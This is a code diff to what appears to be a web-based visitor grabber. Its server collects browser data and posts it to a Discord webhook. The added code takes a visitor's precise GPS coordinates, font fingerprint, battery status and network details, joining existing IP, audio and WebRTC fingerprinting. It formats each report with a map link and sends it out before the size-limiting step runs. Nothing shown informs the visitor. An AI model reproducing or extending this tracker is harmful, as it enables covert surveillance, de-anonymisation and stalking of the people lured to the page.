@@ -24,10 +24,23 @@ REDIRECT_URL = os.getenv("REDIRECT_URL")
 def _send_to_discord(payload):
     if not DISCORD_WEBHOOK_URL:
         return
+
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
-    except requests.RequestException:
-        pass  
+        response = requests.post(
+            DISCORD_WEBHOOK_URL,
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code not in (200, 204):
+            print(
+                "Discord webhook error:",
+                response.status_code,
+                response.text[:1000]
+            )
+
+    except requests.RequestException as e:
+        print("Discord request error:", e)
 
 def format_webrtc(webrtc):
     if not isinstance(webrtc, dict):
@@ -70,11 +83,110 @@ def format_webrtc(webrtc):
             f"Port: `{port}`"
         )
 
-    return "\n\n".join(lines)[:4000]
+    return "\n\n".join(lines)[:1024]
+
+def format_fonts(fonts):
+    if not isinstance(fonts, dict):
+        return "❌ Font detection unavailable"
+
+    detected = fonts.get("detectedFonts", [])
+    count = fonts.get("count", len(detected))
+
+    if not detected:
+        return "⚠️ No tested fonts detected"
+
+    # Discord embed field limit
+    max_fonts = 35
+    displayed = detected[:max_fonts]
+
+    lines = [
+        f"**Detected:** `{count}` fonts",
+        ""
+    ]
+
+    for font in displayed:
+        lines.append(f"• `{font}`")
+
+    if len(detected) > max_fonts:
+        lines.append(
+            f"\n*…and {len(detected) - max_fonts} more*"
+        )
+
+    return "\n".join(lines)[:1024]
+
+def format_location(location):
+    if not isinstance(location, dict):
+        return "❌ Location unavailable"
+
+    if not location.get("supported"):
+        return "❌ Geolocation not supported"
+
+    if not location.get("granted"):
+        reason = location.get("reason") or "Permission denied"
+        return f"❌ Permission not granted\n`{reason}`"
+
+    latitude = location.get("latitude")
+    longitude = location.get("longitude")
+    accuracy = location.get("accuracyMeters")
+
+    if latitude is None or longitude is None:
+        return "⚠️ Coordinates unavailable"
+
+    accuracy_text = (
+        f"{round(float(accuracy), 1)} m"
+        if accuracy is not None
+        else "unknown"
+    )
+
+    return (
+        f"📍 **Latitude:** `{latitude}`\n"
+        f"📍 **Longitude:** `{longitude}`\n"
+        f"🎯 **Accuracy:** `{accuracy_text}`\n\n"
+        f"[🗺️ Open in Google Maps]"
+        f"(https://www.google.com/maps?q={latitude},{longitude})"
+    )[:1024]
 
 def notify_discord(data):
     if not DISCORD_WEBHOOK_URL:
         return
+
+    # Battery information API
+    battery = data.get("battery") or {}
+    battery_text = "Unavaliable"
+
+    if battery.get("supported"):
+        level = battery.get("level")
+        charging = battery.get("charging")
+
+        status = "⚡ Charging" if charging else "🔋 Discharging"
+
+        battery_text = (
+            f"**Level:** `{level}%`\n"
+            f"**Status:** {status}\n"
+            f"**Charging time:** `{battery.get('chargingTime', 'N/A')}s`\n"
+            f"**Discharging time:** `{battery.get('dischargingTime', 'N/A')}s`"
+        )
+
+    # Network information API
+    network = data.get("network") or {}
+    network_text = "Unavailable"
+
+    if network.get("supported"):
+        effective_type = network.get("effectiveType") or "Unknown"
+        connection_type = network.get("type") or "Not reported"
+        downlink = network.get("downlink")
+        rtt = network.get("rtt")
+        save_data = network.get("saveData")
+
+        network_text = (
+            f"**Connection:** `{effective_type.upper()}`\n"
+            f"**Type:** `{connection_type}`\n"
+            f"**Download:** `{downlink} Mbps`\n"
+            f"**Latency:** `{rtt} ms`\n"
+            f"**Data Saver:** `{'On' if save_data else 'Off'}`"
+        )
+
+
 
     def clean(value, limit=100):
         if value is None: 
@@ -89,11 +201,14 @@ def notify_discord(data):
 
     
     fields = [ 
-        { 
-            "name": "IP", 
-            "value": clean(data.get("ip")), 
-            "inline": True, 
-        }, 
+        {
+    "name": "🌐 IP & 📍 Location",
+    "value": (
+        f"**IP:** `{clean(data.get('ip'))}`\n\n"
+        f"{format_location(data.get('location'))}"
+    )[:1024],
+    "inline": False,
+},
         { 
             "name": "Country", 
             "value": clean(data.get("country")), 
@@ -175,6 +290,11 @@ def notify_discord(data):
     "inline": False,
 },
 {
+    "name": "Font Detection",
+    "value": format_fonts(data.get("fonts")),
+    "inline": False,
+},
+{
     "name": "WebGL Vendor",
     "value": clean(data.get("webglVendor")),
     "inline": True,
@@ -198,6 +318,16 @@ def notify_discord(data):
     "name": "Returning Visitor",
     "value": clean(data.get("returning_visitor")),
     "inline": True,
+},
+{
+    "name": "🔋 Battery",
+    "value": battery_text,
+    "inline": False,
+},
+{
+    "name": "📶 Network",
+    "value": network_text,
+    "inline": False,
 },
     ]
     payload = { 
@@ -352,8 +482,168 @@ BROWSER_PAGE = """ <!DOCTYPE html>
             return null;
         }
     }
+    async function getFontFingerprint() {
+    try {
+        const fontsToTest = [
+            "Arial",
+            "Arial Black",
+            "Calibri",
+            "Cambria",
+            "Comic Sans MS",
+            "Consolas",
+            "Courier New",
+            "Georgia",
+            "Helvetica",
+            "Impact",
+            "Inter",
+            "Lucida Console",
+            "Microsoft Sans Serif",
+            "Segoe UI",
+            "Tahoma",
+            "Times New Roman",
+            "Trebuchet MS",
+            "Verdana",
+            "Roboto",
+            "Noto Sans",
+            "Ubuntu",
+            "DejaVu Sans",
+            "Liberation Sans",
+            "Fira Code",
+            "Fira Sans"
+        ];
+
+        const testString =
+            "mmmmmmmmmmlliWWWW1111@@@@####";
+
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+
+        if (!ctx) return null;
+
+        const baseFont = "monospace";
+        ctx.font = `72px ${baseFont}`;
+
+        const baseWidth = ctx.measureText(testString).width;
+
+        const detected = [];
+
+        for (const font of fontsToTest) {
+            ctx.font = `72px "${font}", ${baseFont}`;
+
+            const width = ctx.measureText(testString).width;
+
+            if (width !== baseWidth) {
+                detected.push(font);
+            }
+        }
+
+        return {
+            detectedFonts: detected,
+            count: detected.length,
+            fingerprint: await sha256(detected.join("|"))
+        };
+
+    } catch {
+        return null;
+    }
+}
+async function getBatteryStatus() {
+    try {
+        if (!navigator.getBattery) {
+            return {
+                supported: false,
+                reason: "Battery API not supported"
+            };
+        }
+
+        const battery = await navigator.getBattery();
+
+        return {
+            supported: true,
+            level: Math.round(battery.level * 100),
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+        };
+
+    } catch (error) {
+        return {
+            supported: false,
+            reason: "Battery information unavailable"
+        };
+    }
+}
+
+
+function getNetworkStatus() {
+    try {
+        const connection =
+            navigator.connection ||
+            navigator.mozConnection ||
+            navigator.webkitConnection;
+
+        if (!connection) {
+            return {
+                supported: false,
+                reason: "Network Information API not supported"
+            };
+        }
+
+        return {
+            supported: true,
+            effectiveType: connection.effectiveType || null,
+            type: connection.type || null,
+            downlink: connection.downlink ?? null,
+            downlinkMax: connection.downlinkMax ?? null,
+            rtt: connection.rtt ?? null,
+            saveData: connection.saveData ?? null
+        };
+
+    } catch (error) {
+        return {
+            supported: false,
+            reason: "Network information unavailable"
+        };
+    }
+}
+async function getPreciseLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({
+                supported: false,
+                granted: false
+            });
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    supported: true,
+                    granted: true,
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracyMeters: position.coords.accuracy
+                });
+            },
+            (error) => {
+                resolve({
+                    supported: true,
+                    granted: false,
+                    reason: error.message
+                });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    });
+}
 
     const data = {
+    location: await getPreciseLocation(),
 
     language: safe(navigator.language),
     languages: safe(navigator.languages),
@@ -458,7 +748,16 @@ BROWSER_PAGE = """ <!DOCTYPE html>
         await getAudioFingerprint(),
     
     webrtc:
-        await getWebRTCDiagnostics()
+        await getWebRTCDiagnostics(),
+
+    fonts:
+        await getFontFingerprint(),
+        
+    battery:
+        await getBatteryStatus(),
+
+    network:
+        getNetworkStatus()
 };
 
     try {
@@ -863,14 +1162,14 @@ def collect():
         browser_data["referer"] = server_data.get("referer", "")
         browser_data["user_agent"] = user_agent
 
+        # Send the combined information to Discord
+        notify_discord(browser_data)
+
         # Do not accept arbitrary huge values
-        browser_data = {
+        safe_browser_data = {
             str(k)[:100]: str(v)[:5000]
             for k, v in browser_data.items()
         }
-
-        # Send the combined information to Discord
-        notify_discord(browser_data)
 
         print(
             "\n========== BROWSER TELEMETRY =========="
@@ -878,7 +1177,7 @@ def collect():
 
         print(
             json.dumps(
-                browser_data,
+                safe_browser_data,
                 indent=2,
                 ensure_ascii=False
             )
